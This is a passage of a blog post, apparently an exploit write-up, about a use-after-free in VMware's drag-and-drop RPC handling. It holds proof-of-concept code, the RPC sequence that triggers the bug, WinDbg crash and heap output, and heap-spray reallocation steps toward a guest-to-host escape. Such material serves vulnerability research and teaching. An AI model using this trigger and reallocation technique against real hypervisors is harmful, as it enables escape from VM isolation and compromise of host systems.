+<a id="__codelineno-0-22" name="__codelineno-0-22"></a>    <span class="n">RpcSendRequest</span><span class="p">(</span><span class="n">addressof</span><span class="p">(</span><span class="n">chgver</span><span class="p">),</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">chgver</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+<a id="__codelineno-0-23" name="__codelineno-0-23"></a>    <span class="n">outLen</span><span class="o">.</span><span class="n">value</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<a id="__codelineno-0-24" name="__codelineno-0-24"></a>
+<a id="__codelineno-0-25" name="__codelineno-0-25"></a>    <span class="n">RpcSendRequest</span><span class="p">(</span><span class="n">addressof</span><span class="p">(</span><span class="n">sgfr</span><span class="p">),</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">sgfr</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+</code></pre></div></td></tr></table></div>
+<p>Pay close attention to the final call to <code>dnd.setGuestFileRoot</code>. This RPC command dereferences a pointer on a freed object. Ultimately, this is how we trigger the vulnerability for exploitation.</p>
+<h1 id="preliminary-analysis">Preliminary Analysis<a class="headerlink" href="#preliminary-analysis" title="Permanent link">&para;</a></h1>
+<p>First things first, we are going to open all of the relevant functions in IDA to better understand how this vulnerability was found and fits together. Starting with; <code>tools.capability.dnd_version</code>.</p>
+<h2 id="toolscapabilitydnd_version">tools.capability.dnd_version<a class="headerlink" href="#toolscapabilitydnd_version" title="Permanent link">&para;</a></h2>
+<p>Doing a text search for "tools.capability.dnd_version" in IDA, we can find the string in a dispatcher table. Based on previous analysis, I know that the function is the one referenced in the <code>lea r9, sub_xxxxx</code> instruction.</p>
+<figure>
+<p><img alt="tools.capability.dnd_version Dispatcher" src="/assets/images/posts/pwn2own-escape/toolsdndversion.png" /></p>
+</figure>
+<p>In this case, that means that <code>sub_88220</code> is our target function. Fortunately for us, there isn't too much code to go through. There are a number of validation checks that we need to pass. The first one being that the function must take at least one argument, i.e, the version number.</p>
+<figure>
+<p><img alt="Is there an argument?" src="/assets/images/posts/pwn2own-escape/toolsdndversion_argumentnumber.png" /></p>
+</figure>
+<p>The second check is a check on whether the inputted argument is an integer or not, we can confirm this based on the failure block seen below.</p>
+<figure>
+<p><img alt="Is the argument an integer?" src="/assets/images/posts/pwn2own-escape/toolsdndversion_argumentinteger.png" /></p>
+</figure>
+<p>The third check checks whether the inputted argument is an integer greater than or equal to 2. If it is not then the failure block shown below is taken.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/toolsdndversion_jgetest.png" /></p>
+</figure>
+<figure>
+<p><img alt="Is the argument greater than or equal to 2?" src="/assets/images/posts/pwn2own-escape/toolsdndversion_argumentgreaterthan2.png" /></p>
+</figure>
+<p>Following these checks the execution is brought into <code>sub_70610</code>. Now, going deeper on how the version switch works is out of the scope of the article, however, below is a big picture of that function just in-case you wanted to further investigate. <em>Keep in mind, this is from version 12, VMWare will have changed significantly</em>.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/sub_70610.png" /></p>
+</figure>
+<p>If we further investigate the return from this function, we can see that a check is performed to confirm if the version was set correctly.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/failed_to_set_vmdb.png" /></p>
+</figure>
+<p>Perhaps one point of further investigation if you are interested, is working out why we take an extra function if the the static version 3 is less than the inputted argument. Shown in the screenshot below. (My guess is compatibility reasons).</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/toolsdndversion_lessthan3.png" /></p>
+</figure>
+<h2 id="vmxcapabilitydnd_version">vmx.capability.dnd_version<a class="headerlink" href="#vmxcapabilitydnd_version" title="Permanent link">&para;</a></h2>
+<p>Next up, we are going to investigate <code>vmx.capability.dnd_version</code> since we know already that this request is what switches the version over. That means that <code>tools.capability.dnd_version</code> sets the version, but this call makes the switch. Let's take a closer look at how this call works.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/vmx.capability.dnd_version.png" /></p>
+</figure>
+<p>We can rename <code>sub_83F30</code> to its correct name now, <code>vmx.capability.dnd_verison</code>. It is quite a simple function, in-fact. Firstly there is a check to make sure we didn't pass an argument, if we did then the function will fail.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/vmx.capability.dnd_version_argument.png" /></p>
+</figure>
+<p>Again, we see that use of <code>sub_67D80</code>, which we assume is some kind of event log/tear down function, something like that. Assuming we don't pass an argument, this function is quite simple on the surface. There are a few nested calls, however, that is out the scope of this article.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/vmx.capability.dnd_version_rest.png" /></p>
+</figure>
+<p>Further analysis out of the scope of this article however if you are interested in performing further analysis, the rest of the function is shown above.</p>
+<h2 id="recap">Recap<a class="headerlink" href="#recap" title="Permanent link">&para;</a></h2>
+<p>Before examining the final function, let's do a quick recap of what we know so far;</p>
+<p>1) We use <code>tools.capability.dnd_version</code> to set the version we want.
+2) We use <code>vmx.capability.dnd_version</code> to change the version.</p>
+<p>We also know if we set the version to 2, then change the version, then set it to 4 and then change it again, any subsequent call to <code>dnd.setGuestFileRoot</code> triggers a Use-After-Free. Let's investigate this function <code>dnd.setGuestFileRoot</code> to try and better understand why that occurs.</p>
+<h2 id="dndsetguestfileroot">dnd.setGuestFileRoot<a class="headerlink" href="#dndsetguestfileroot" title="Permanent link">&para;</a></h2>
+<p>We'll have to perform a text search for this string because it isn't anywhere to be seen in the dispatcher table we found the previous two functions in. A search reveals that it is indeed in a different dispatcher table, shown below.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/dnd.setGuestFileRoot_dispatcher.png" /></p>
+</figure>
+<p>Based on this screenshot, and our knowledge of the previous dispatcher table it is clear that <code>sub_9D090</code> is the function <code>dnd.setGuestFileRoot</code>. Remember, we know that this function is responsible for triggering the UAF. That is due to the fact this function is responsible for dereferencing the freed object. </p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/dnd.setGuestFileRoot.png" /></p>
+</figure>
+<p>In-fact, something I learned while researching this bug is that any <code>dnd.xxxx</code> function would trigger the Use-After-Free, this was noted in the following post on <a href="https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware">ZDI</a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a>&gt;   tools.capability.dnd_version 2 
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a>&gt;   vmx.capability.dnd_version
+<a id="__codelineno-1-3" name="__codelineno-1-3"></a>&gt;   tools.capability.dnd_version 3
+<a id="__codelineno-1-4" name="__codelineno-1-4"></a>&gt;   vmx.capability.dnd_version
+<a id="__codelineno-1-5" name="__codelineno-1-5"></a>&gt;   dnd.setGuestFileRoot AAAAA // Technically any DnD function would work.
+</code></pre></div></td></tr></table></div>
+<p>We can opt to test (and understand this theory for ourselves). Let's take a look at some of the other <code>dnd</code> functions from a high level in IDA.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/diff.png" /></p>
+</figure>
+<p>As you can see, they are in-fact, almost indetical. From this we can assume that the <code>mov rax, [rcx]</code> is the reuse. Since they all make this dereference and we know that causes the crash from previous research. We can confirm this theory by running our POC with PageHeap enabled in order to confirm if each of these function calls trigger the crash. First up, using the <code>dnd.setGuestFileRoot</code> payload.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a>(126c.9c): Access violation - code c0000005 (first chance)
+<a id="__codelineno-2-2" name="__codelineno-2-2"></a>First chance exceptions are reported before any exception handling.
+<a id="__codelineno-2-3" name="__codelineno-2-3"></a>This exception may be expected and handled.
+<a id="__codelineno-2-4" name="__codelineno-2-4"></a>vmware_vmx+0x9d0aa:
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a>00007ff6`e755d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`26b9ef40=????????????????
+<a id="__codelineno-2-6" name="__codelineno-2-6"></a>0:013&gt; !heap -p -a @rcx
+<a id="__codelineno-2-7" name="__codelineno-2-7"></a>    address 0000000026b9ef40 found in
+<a id="__codelineno-2-8" name="__codelineno-2-8"></a>    _DPH_HEAP_ROOT @ 40b1000
+<a id="__codelineno-2-9" name="__codelineno-2-9"></a>    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+<a id="__codelineno-2-10" name="__codelineno-2-10"></a>                                   25dbcb60:         26b9e000             2000
+<a id="__codelineno-2-11" name="__codelineno-2-11"></a>    00007ffc14cc3fa1 ntdll!RtlDebugFreeHeap+0x0000000000032eb5
+<a id="__codelineno-2-12" name="__codelineno-2-12"></a>    00007ffc14cb95c9 ntdll!RtlpFreeHeap+0x00000000000866a9
+<a id="__codelineno-2-13" name="__codelineno-2-13"></a>    00007ffc14c311fd ntdll!RtlFreeHeap+0x000000000000041d
+<a id="__codelineno-2-14" name="__codelineno-2-14"></a>    00000000594bcabc MSVCR90!free+0x000000000000001c [f:\dd\vctools\crt_bld\self_64_amd64\crt\src\free.c @ 110]
+<a id="__codelineno-2-15" name="__codelineno-2-15"></a>    00007ff6e7562d27 vmware_vmx+0x00000000000a2d27
+<a id="__codelineno-2-16" name="__codelineno-2-16"></a>
+<a id="__codelineno-2-17" name="__codelineno-2-17"></a>    // Removed for brevity.
+</code></pre></div></td></tr></table></div>
+<p>As expected, the Use-After-Free triggers an access violation. Now let's modify the payload and try using <code>dnd.feedback</code> instead. As assumed, the crash does indeed trigger.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a>(197c.168): Access violation - code c0000005 (first chance)
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a>First chance exceptions are reported before any exception handling.
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a>This exception may be expected and handled.
+<a id="__codelineno-3-4" name="__codelineno-3-4"></a>vmware_vmx+0x9d19a:
+<a id="__codelineno-3-5" name="__codelineno-3-5"></a>00007ff6`e755d19a 488b01          mov     rax,qword ptr [rcx] ds:00000000`263c5f40=????????????????
+<a id="__codelineno-3-6" name="__codelineno-3-6"></a>0:013&gt; !heap -p -a @rcx
+<a id="__codelineno-3-7" name="__codelineno-3-7"></a>    address 00000000263c5f40 found in
+<a id="__codelineno-3-8" name="__codelineno-3-8"></a>    _DPH_HEAP_ROOT @ 4b71000
+<a id="__codelineno-3-9" name="__codelineno-3-9"></a>    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+<a id="__codelineno-3-10" name="__codelineno-3-10"></a>                                   26607068:         263c5000             2000
+<a id="__codelineno-3-11" name="__codelineno-3-11"></a>    00007ffc14cc3fa1 ntdll!RtlDebugFreeHeap+0x0000000000032eb5
+<a id="__codelineno-3-12" name="__codelineno-3-12"></a>    00007ffc14cb95c9 ntdll!RtlpFreeHeap+0x00000000000866a9
+<a id="__codelineno-3-13" name="__codelineno-3-13"></a>    00007ffc14c311fd ntdll!RtlFreeHeap+0x000000000000041d
+<a id="__codelineno-3-14" name="__codelineno-3-14"></a>    00000000594bcabc MSVCR90!free+0x000000000000001c [f:\dd\vctools\crt_bld\self_64_amd64\crt\src\free.c @ 110]
+<a id="__codelineno-3-15" name="__codelineno-3-15"></a>    00007ff6e7562d27 vmware_vmx+0x00000000000a2d27
+<a id="__codelineno-3-16" name="__codelineno-3-16"></a>
+<a id="__codelineno-3-17" name="__codelineno-3-17"></a>    // Removed for brevity.
+</code></pre></div></td></tr></table></div>
+<p>Great. So the post was right, any dnd function will trigger this Use-Afrer-Free. Our next question is... Why? Of course, we already know the reason for that, because all of these dnd functions perform a dereference on the freed object. Let's now take some time to analyse the crash in more detail. After which, we can begin exploitation.</p>
+<h1 id="analysing-the-crash">Analysing the Crash<a class="headerlink" href="#analysing-the-crash" title="Permanent link">&para;</a></h1>
+<p>Based on the outputs that we retrieved using Page Heap, we can see the entire chain that leads up to the free and subsequently the dereference that causes the crash. We'll analyse the crash from <code>dnd.setGuestFileRoot</code> for the sake of article uniformity. If we jump to the offset that caused the crash <code>vmware_vmx+0x9d0aa</code> we find that our presumption of the <code>mov rax, [rcx]</code> instruction causing the crash was correct.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/uaftrigger.png" /></p>
+</figure>
+<p>What we're really interested in of course is the steps which lead up to the crash. From the output already given based on Page Heap, we can see where the return following the free is.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/0xa2d27.png" /></p>
+</figure>
+<p>If we open the <code>opus_repacketizer_destroy</code> function in IDA, we clearly see that it makes a call to free.</p>
+<figure>
+<p><img alt="" src="/assets/images/posts/pwn2own-escape/opus_repacketsizer_destroy.png" /></p>
+</figure>
+<p>Great, so there's the actual free which results in the Use-After-Free. Now, we could go through each location in the Page Heap traceback individually, but that would make this article extremely long. If you're interested understanding more about the objects lifetime, below is the stack trace and heap page output for you to trace yourself.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span>
+<span class="normal"><a href="#__codelineno-4-16">16</a></span>
+<span class="normal"><a href="#__codelineno-4-17">17</a></span>
+<span class="normal"><a href="#__codelineno-4-18">18</a></span>
+<span class="normal"><a href="#__codelineno-4-19">19</a></span>
+<span class="normal"><a href="#__codelineno-4-20">20</a></span>
+<span class="normal"><a href="#__codelineno-4-21">21</a></span>
+<span class="normal"><a href="#__codelineno-4-22">22</a></span>
+<span class="normal"><a href="#__codelineno-4-23">23</a></span>
+<span class="normal"><a href="#__codelineno-4-24">24</a></span>
+<span class="normal"><a href="#__codelineno-4-25">25</a></span>
+<span class="normal"><a href="#__codelineno-4-26">26</a></span>
+<span class="normal"><a href="#__codelineno-4-27">27</a></span>
+<span class="normal"><a href="#__codelineno-4-28">28</a></span>
+<span class="normal"><a href="#__codelineno-4-29">29</a></span>
+<span class="normal"><a href="#__codelineno-4-30">30</a></span>
+<span class="normal"><a href="#__codelineno-4-31">31</a></span>
+<span class="normal"><a href="#__codelineno-4-32">32</a></span>
+<span class="normal"><a href="#__codelineno-4-33">33</a></span>
+<span class="normal"><a href="#__codelineno-4-34">34</a></span>
+<span class="normal"><a href="#__codelineno-4-35">35</a></span>
+<span class="normal"><a href="#__codelineno-4-36">36</a></span>
+<span class="normal"><a href="#__codelineno-4-37">37</a></span>
+<span class="normal"><a href="#__codelineno-4-38">38</a></span>
+<span class="normal"><a href="#__codelineno-4-39">39</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a>0:012&gt; !heap -p -a @rcx
+<a id="__codelineno-4-2" name="__codelineno-4-2"></a>    address 000000001e2aef40 found in
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a>    _DPH_HEAP_ROOT @ 4961000
+<a id="__codelineno-4-4" name="__codelineno-4-4"></a>    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+<a id="__codelineno-4-5" name="__codelineno-4-5"></a>                                   1e6f2a28:         1e2ae000             2000
+<a id="__codelineno-4-6" name="__codelineno-4-6"></a>    00007ffc14cc3fa1 ntdll!RtlDebugFreeHeap+0x0000000000032eb5
+<a id="__codelineno-4-7" name="__codelineno-4-7"></a>    00007ffc14cb95c9 ntdll!RtlpFreeHeap+0x00000000000866a9
+<a id="__codelineno-4-8" name="__codelineno-4-8"></a>    00007ffc14c311fd ntdll!RtlFreeHeap+0x000000000000041d
+<a id="__codelineno-4-9" name="__codelineno-4-9"></a>    00000000594bcabc MSVCR90!free+0x000000000000001c [f:\dd\vctools\crt_bld\self_64_amd64\crt\src\free.c @ 110]
+<a id="__codelineno-4-10" name="__codelineno-4-10"></a>    00007ff6e7562d27 vmware_vmx+0x00000000000a2d27
+<a id="__codelineno-4-11" name="__codelineno-4-11"></a>    00007ff6e755c48d vmware_vmx+0x000000000009c48d
+<a id="__codelineno-4-12" name="__codelineno-4-12"></a>    00007ff6e753a57e vmware_vmx+0x000000000007a57e
+<a id="__codelineno-4-13" name="__codelineno-4-13"></a>    00007ff6e7543fb0 vmware_vmx+0x0000000000083fb0
+<a id="__codelineno-4-14" name="__codelineno-4-14"></a>    00007ff6e7529486 vmware_vmx+0x0000000000069486
+<a id="__codelineno-4-15" name="__codelineno-4-15"></a>    00007ff6e754bbd6 vmware_vmx+0x000000000008bbd6
+<a id="__codelineno-4-16" name="__codelineno-4-16"></a>    00007ff6e757aea0 vmware_vmx+0x00000000000baea0
+<a id="__codelineno-4-17" name="__codelineno-4-17"></a>    00007ff6e757af24 vmware_vmx+0x00000000000baf24
+<a id="__codelineno-4-18" name="__codelineno-4-18"></a>    00007ff6e786b4a5 vmware_vmx!opus_repacketizer_get_nb_frames+0x000000000015ffb5
+<a id="__codelineno-4-19" name="__codelineno-4-19"></a>    00007ff6e78492f5 vmware_vmx!opus_repacketizer_get_nb_frames+0x000000000013de05
+<a id="__codelineno-4-20" name="__codelineno-4-20"></a>    00007ff6e787b992 vmware_vmx!opus_repacketizer_get_nb_frames+0x00000000001704a2
+<a id="__codelineno-4-21" name="__codelineno-4-21"></a>    00007ff6e7849668 vmware_vmx!opus_repacketizer_get_nb_frames+0x000000000013e178
+<a id="__codelineno-4-22" name="__codelineno-4-22"></a>    00007ff6e76b007b vmware_vmx+0x00000000001f007b
+<a id="__codelineno-4-23" name="__codelineno-4-23"></a>    00007ffc13ed2774 KERNEL32!BaseThreadInitThunk+0x0000000000000014
+<a id="__codelineno-4-24" name="__codelineno-4-24"></a>    00007ffc14c70d61 ntdll!RtlUserThreadStart+0x0000000000000021
+<a id="__codelineno-4-25" name="__codelineno-4-25"></a>
+<a id="__codelineno-4-26" name="__codelineno-4-26"></a>0:012&gt; k
+<a id="__codelineno-4-27" name="__codelineno-4-27"></a> # Child-SP          RetAddr           Call Site
+<a id="__codelineno-4-28" name="__codelineno-4-28"></a>00 00000000`3cf974c0 00007ff6`e7529486 vmware_vmx+0x9d0aa
+<a id="__codelineno-4-29" name="__codelineno-4-29"></a>01 00000000`3cf974f0 00007ff6`e754bbd6 vmware_vmx+0x69486
+<a id="__codelineno-4-30" name="__codelineno-4-30"></a>02 00000000`3cf97590 00007ff6`e757aea0 vmware_vmx+0x8bbd6
+<a id="__codelineno-4-31" name="__codelineno-4-31"></a>03 00000000`3cf975c0 00007ff6`e757af24 vmware_vmx+0xbaea0
+<a id="__codelineno-4-32" name="__codelineno-4-32"></a>04 00000000`3cf97610 00007ff6`e786b4a5 vmware_vmx+0xbaf24
+<a id="__codelineno-4-33" name="__codelineno-4-33"></a>05 00000000`3cf97650 00007ff6`e78492f5 vmware_vmx!opus_repacketizer_get_nb_frames+0x15ffb5
+<a id="__codelineno-4-34" name="__codelineno-4-34"></a>06 00000000`3cf9f730 00007ff6`e787b992 vmware_vmx!opus_repacketizer_get_nb_frames+0x13de05
+<a id="__codelineno-4-35" name="__codelineno-4-35"></a>07 00000000`3cf9f760 00007ff6`e7849668 vmware_vmx!opus_repacketizer_get_nb_frames+0x1704a2
+<a id="__codelineno-4-36" name="__codelineno-4-36"></a>08 00000000`3cf9f790 00007ff6`e76b007b vmware_vmx!opus_repacketizer_get_nb_frames+0x13e178
+<a id="__codelineno-4-37" name="__codelineno-4-37"></a>09 00000000`3cf9f910 00007ffc`13ed2774 vmware_vmx+0x1f007b
+<a id="__codelineno-4-38" name="__codelineno-4-38"></a>0a 00000000`3cf9f970 00007ffc`14c70d61 KERNEL32!BaseThreadInitThunk+0x14
+<a id="__codelineno-4-39" name="__codelineno-4-39"></a>0b 00000000`3cf9f9a0 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+</code></pre></div></td></tr></table></div>
+<p>Before we dig into exploitation, we need to know the size of the object, we can get this by setting a breakpoint just before the free occurs and analysing the heap.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-5-10">10</a></span>
+<span class="normal"><a href="#__codelineno-5-11">11</a></span>
+<span class="normal"><a href="#__codelineno-5-12">12</a></span>
+<span class="normal"><a href="#__codelineno-5-13">13</a></span>
+<span class="normal"><a href="#__codelineno-5-14">14</a></span>
+<span class="normal"><a href="#__codelineno-5-15">15</a></span>
+<span class="normal"><a href="#__codelineno-5-16">16</a></span>
+<span class="normal"><a href="#__codelineno-5-17">17</a></span>
+<span class="normal"><a href="#__codelineno-5-18">18</a></span>
+<span class="normal"><a href="#__codelineno-5-19">19</a></span>
+<span class="normal"><a href="#__codelineno-5-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a>Breakpoint 0 hit
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a>vmware_vmx+0xa2d1f:
+<a id="__codelineno-5-3" name="__codelineno-5-3"></a>00007ff6`e7562d1f 488bcf          mov     rcx,rdi
+<a id="__codelineno-5-4" name="__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5"></a>0:013&gt; p
+<a id="__codelineno-5-6" name="__codelineno-5-6"></a>vmware_vmx+0xa2d22:
+<a id="__codelineno-5-7" name="__codelineno-5-7"></a>00007ff6`e7562d22 e819ee3500      call    vmware_vmx!opus_decoder_destroy (00007ff6`e78c1b40)
+<a id="__codelineno-5-8" name="__codelineno-5-8"></a>
+<a id="__codelineno-5-9" name="__codelineno-5-9"></a>0:013&gt; !heap -p -a rcx
+<a id="__codelineno-5-10" name="__codelineno-5-10"></a>    address 0000000030522f40 found in
+<a id="__codelineno-5-11" name="__codelineno-5-11"></a>    _DPH_HEAP_ROOT @ 4821000
+<a id="__codelineno-5-12" name="__codelineno-5-12"></a>    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+<a id="__codelineno-5-13" name="__codelineno-5-13"></a>                                30621410:         30522f40               b8 -         30522000             2000
+<a id="__codelineno-5-14" name="__codelineno-5-14"></a>          ? vmware_vmx!opus_get_version_string+7c548
+<a id="__codelineno-5-15" name="__codelineno-5-15"></a>    00007ffc14cc3f7f ntdll!RtlDebugAllocateHeap+0x0000000000033227
+<a id="__codelineno-5-16" name="__codelineno-5-16"></a>    00007ffc14cb8294 ntdll!RtlpAllocateHeap+0x000000000008a7c4
+<a id="__codelineno-5-17" name="__codelineno-5-17"></a>    00007ffc14c2b89a ntdll!RtlpAllocateHeapInternal+0x0000000000000a0a
+<a id="__codelineno-5-18" name="__codelineno-5-18"></a>    00000000594bcb87 MSVCR90!malloc+0x000000000000005b [f:\dd\vctools\crt_bld\self_64_amd64\crt\src\malloc.c @ 163]
+<a id="__codelineno-5-19" name="__codelineno-5-19"></a>    00007ff6e7894ecf vmware_vmx!opus_repacketizer_get_nb_frames+0x00000000001899df
+<a id="__codelineno-5-20" name="__codelineno-5-20"></a>    00007ff6e755c56a vmware_vmx+0x000000000009c56a
+</code></pre></div></td></tr></table></div>
+<p>Based on the output above, we can see that the freed object size is 0xb8. And based on information from the aforementioned ZDI article, we know that the dangling pointer is kept in an object size of 0x38, which gets allocated when the VM starts.</p>
+<h1 id="reallocation">Reallocation<a class="headerlink" href="#reallocation" title="Permanent link">&para;</a></h1>
+<p>As with the exploitation of all UAFs the most important thing we require is the ability to reallocate the freed object with our own data. We also need to keep in mind that the reallocation must end up in the same heap as the freed allocation, otherwise we won't be able to control the freed data. How the heap works is out of the scope of this article, but if you're not familar with the heap then I would recommend you understand that first, before preceding.</p>
+<p>Based on previous research by MarvelTeam there are a few ways in which we can perform reallocation for this vulnerability. Two commonly used RPC calls are; <code>tools.capability.guest_temp_directory</code> and <code>guest.upgrader_send_cmd_line_args</code>. There are others as well, such as;</p>
+<ul>
+<li><code>info-get</code></li>
+<li><code>info-set</code></li>
+<li><code>ToolsAutoInstallGetParams</code></li>
+</ul>
+<h2 id="toolscapabilityguest_temp_directory">tools.capability.guest_temp_directory<a class="headerlink" href="#toolscapabilityguest_temp_directory" title="Permanent link">&para;</a></h2>
+<p>We want to test that we can in-fact use these RPC commands to allocate in the same LFH. We can do this by simply executing one of the commands with our own data and then searching the application for the data. But remember, the LFH is randomised so we need to beat it. In this case, that is actually quite simple. There is nothing stopping us from sending the command muiltiple times in order to flood the target LFH.</p>
+<p>It isn't possible for us to know exactly how many times we need to send the request to obtain allocation in the target, so this is where trial and error comes in. Eventually we find perfect allocation at 0x40.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
